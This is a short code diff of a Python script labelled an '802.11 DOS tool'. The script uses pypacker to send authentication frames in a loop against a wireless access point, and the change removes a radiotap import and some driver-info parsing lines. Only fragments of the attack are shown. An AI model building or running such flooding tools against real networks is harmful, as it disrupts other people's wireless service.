@@ -1,7 +1,7 @@
 """802.11 DOS tool"""
 
 from pypacker import pypacker
-from pypacker.layer12 import ieee80211, prism, radiotap
+from pypacker.layer12 import ieee80211, prism
 from pypacker import psocket
 import time
 
@@ -19,8 +19,6 @@ auth_req	= prism(len=24) +\
 print("starting DOS attack on AP %s" % ap_mac)
 
 for i in range(10000):
-	#drvinfo = radiotap.Radiotap(raw_bytes)
-	drvinfo = prism.Prism(raw_bytes)
 	start_time = time.time()
 
 	if i % 100 == 0:
